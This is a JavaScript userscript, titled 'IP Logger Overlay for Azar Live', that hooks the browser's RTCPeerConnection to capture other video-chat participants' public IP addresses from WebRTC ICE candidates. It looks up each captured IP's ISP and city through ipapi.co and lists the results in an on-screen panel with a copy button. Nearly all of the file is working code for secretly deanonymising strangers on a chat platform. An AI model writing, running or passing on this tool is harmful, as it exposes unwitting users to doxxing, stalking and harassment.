// === IP Logger Overlay for Azar Live ===
// Auteur : AIZEN-javascript

const css = `
#ip-logger {
  position: fixed;
  top: 20px;
  right: 20px;
  width: 340px;
  max-height: 500px;
  background: #111;
  border: 1px solid lime;
  border-radius: 8px;
  font-family: monospace;
  color: lime;
  box-shadow: 0 0 12px rgba(0,255,0,0.4);
  z-index: 99999;
  display: flex;
  flex-direction: column;
}
#ip-logger-header {
  background: #000;
  padding: 10px 16px;
  border-bottom: 1px solid lime;
  display: flex;
  justify-content: space-between;
  align-items: center;
  cursor: move;
}
#ip-logger-header h4 {
  margin: 0;
  font-size: 16px;
}
#ip-logger-body {
  flex: 1;
  overflow-y: auto;
  padding: 12px 16px;
}
.ip-entry {
  background: #000;
  border: 1px solid lime;
  border-radius: 6px;
  padding: 10px;
  margin-bottom: 10px;
}
.ip-entry span {
  display: block;
  margin-bottom: 4px;
}
.ip-entry button {
  margin-top: 6px;
  padding: 6px 10px;
  background: #0f0;
  color: #000;
  border: none;
  border-radius: 4px;
  font-weight: bold;
  cursor: pointer;
}
#ip-logger-footer {
  padding: 10px 16px;
  background: #000;
  border-top: 1px solid lime;
  display: flex;
  justify-content: space-between;
}
#ip-logger-footer button {
  background: #e74c3c;
  color: white;
  border: none;
  padding: 6px 10px;
  border-radius: 4px;
  font-weight: bold;
  cursor: pointer;
}
`;

const style = document.createElement('style');
style.textContent = css;
document.head.appendChild(style);

// Création de l'interface principale
const logger = document.createElement('div');
logger.id = 'ip-logger';
logger.innerHTML = `
  <div id="ip-logger-header">
    <h4>🟢 IP Logger</h4>
    <button id="close-logger">×</button>
  </div>
  <div id="ip-logger-body"></div>
  <div id="ip-logger-footer">
    <button id="clear-logger">Clear</button>
  </div>
`;
document.body.appendChild(logger);

const body = document.getElementById('ip-logger-body');

// Drag & Drop de l'interface
(() => {
  const header = document.getElementById('ip-logger-header');
  let isDragging = false;
  let offsetX = 0, offsetY = 0;

  header.addEventListener('mousedown', (e) => {
    isDragging = true;
    offsetX = e.clientX - logger.offsetLeft;
    offsetY = e.clientY - logger.offsetTop;
  });

  document.addEventListener('mousemove', (e) => {
    if (isDragging) {
      logger.style.left = `${e.clientX - offsetX}px`;
      logger.style.top = `${e.clientY - offsetY}px`;
    }
  });

  document.addEventListener('mouseup', () => {
    isDragging = false;
  });
})();

// Bouton Clear
document.getElementById('clear-logger').onclick = () => {
  body.innerHTML = '';
};

// Bouton Fermer
document.getElementById('close-logger').onclick = () => {
  logger.remove();
};

// Interception des IP WebRTC (via STUN)
window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
  const pc = new window.oRTCPeerConnection(...args);
  pc._addIceCandidate = pc.addIceCandidate;

  pc.addIceCandidate = function (iceCandidate, ...rest) {
    try {
      const fields = iceCandidate.candidate.split(' ');
      if (fields[7] === 'srflx') {
        const ip = fields[4];
        const time = new Date().toLocaleTimeString();

        // Récupération des infos géographiques
        fetch(`https://ipapi.co/${ip}/json/`)
          .then(r => r.json())
          .then(data => {
            const isp = data.org || 'Unknown ISP';
            const city = data.city || 'Unknown City';

            const entry = document.createElement('div');
            entry.className = 'ip-entry';
            const info = `IP: ${ip} | ISP: ${isp} | City: ${city}`;

            entry.innerHTML = `
              <span><strong>Heure:</strong> ${time}</span>
              <span><strong>IP:</strong> ${ip}</span>
              <span><strong>Fournisseur:</strong> ${isp}</span>
              <span><strong>Ville:</strong> ${city}</span>
              <button>Copy</button>
            `;

            const btn = entry.querySelector('button');
            btn.onclick = () => {
              navigator.clipboard.writeText(info).then(() => {
                btn.textContent = 'Copié !';
                btn.style.background = '#27ae60';
                setTimeout(() => {
                  btn.textContent = 'Copy';
                  btn.style.background = '#0f0';
                }, 1500);
              });
            };

            body.appendChild(entry);
          })
          .catch(console.error);
      }
    } catch (e) {
      console.error('Erreur lors du parsing ICE:', e);
    }

    return pc._addIceCandidate(iceCandidate, ...rest);
  };

  return pc;
};
